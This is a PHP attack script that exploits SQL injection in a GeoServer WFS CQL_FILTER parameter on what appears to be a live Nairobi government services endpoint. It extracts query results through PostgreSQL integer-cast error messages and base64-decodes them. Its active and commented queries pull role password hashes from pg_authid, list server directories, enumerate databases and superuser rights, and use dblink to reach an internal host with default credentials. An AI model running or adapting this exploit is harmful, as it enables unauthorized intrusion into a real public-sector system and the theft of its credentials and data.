<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

//$sql_a = "select * from pg_ls_dir('../../../../../home/super')";
$sql_a = "SELECT rolname, rolpassword FROM pg_authid";
//$sql_a = "SELECT * FROM pg_authid";
//$sql_a = "SELECT * FROM pg_available_extensions";
//$sql_a = "DROP TABLE IF EXISTS pg_cmd";
//$sql_a = "CREATE EXTENSION dblink";
$sql_a = "SHOW password_encryption";


//$sql_a = "SELECT dblink_exec( 'host=192.168.102.22 dbname=postgres user=postgres password=postgres', 'SELECT user' );";
//$sql_a = "SELECT * FROM dblink( 'host=192.168.102.22 dbname=postgres user=postgres password=postgres', 'SELECT version()' ) AS result(user_name TEXT)";

//$sql = 'SELECT version()';
//$sql = "SELECT datname FROM pg_database WHERE datname = (geonode)";
//$sql = "SELECT json_agg(t) FROM (SELECT datname FROM pg_database) t";

//$sql = 'SELECT current_database()';
//$sql = 'SELECT usesuper FROM pg_user LIMIT 1 OFFSET 5';
//$sql = 'SELECT usecreatedb FROM pg_user LIMIT 1 OFFSET 5';
//$sql = 'SELECT datname FROM pg_database LIMIT 1 OFFSET 20';
$sql_a = str_replace("'","$$",$sql_a);
$sql = 'SELECT encode(json_agg(t)::TEXT::bytea, $$base64$$) AS base64_encoded FROM ('.$sql_a.') t';

$cql_filter = "strStartsWith(applicat_4,'x'') = true and 1=(SELECT CAST ((" . $sql . ") AS INTEGER)) -- ') = true";
//$cql_filter = "strStartsWith(applicat_4,'x'') = true and 1=('.$sql.') -- ') = true";
$cql_filter = urlencode($cql_filter);
$curl = curl_init();

curl_setopt_array($curl, array(
  //CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/ows?version=1.0.0&request=GetFeature&service=wfs&typeName=npdms%3Aam_few_advert_structures&CQL_FILTER='.$cql_filter,
  CURLOPT_URL => 'https://edev.nairobiservices.go.ke/api/maps/geoserver/ows?version=1.0.0&request=GetFeature&service=wfs&typeName=npdms%3Aam_few_advert_structures&CQL_FILTER=' . $cql_filter,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$response = curl_exec($curl);

curl_close($curl);
echo $response.'<br/><br/><br/>';

function extractBase64FromXML($xmlContent) {
  // Suppress errors during parsing in case the XML is not well-formed
  libxml_use_internal_errors(true);

  // Load the XML
  $xml = simplexml_load_string($xmlContent);
  if ($xml === false) {
      return "Invalid XML content.";
  }

  // Extract the content within <ServiceException>
  $serviceException = (string)$xml->ServiceException;
  if (empty($serviceException)) {
      return "No <ServiceException> content found.";
  }

  // Decode HTML entities (e.g., &quot;)
  $decodedContent = html_entity_decode($serviceException);

  // Find the base64-encoded string using a regex pattern that handles multiline and whitespace
  $pattern = '/ERROR: invalid input syntax for type integer: "(.*?)"/s'; // `s` flag allows matching across lines
  if (preg_match($pattern, $decodedContent, $matches)) {
      $base64String = $matches[1];

      // Remove any unwanted newlines or extra spaces from the base64 string
      $base64String = preg_replace('/\s+/', '', $base64String);

      // Validate the base64 string
      if (base64_decode($base64String, true) !== false) {
          return $base64String;
      } else {
          return "Extracted content is not a valid base64 string.";
      }
  } else {
      return "No base64-encoded string found in the content.";
  }
}


$output = extractBase64FromXML($response);
$output = base64_decode($output);
echo '<pre>'.$output.'</pre>';

/*
starehe_parcels
au_nairobi_subcounty_unit

*/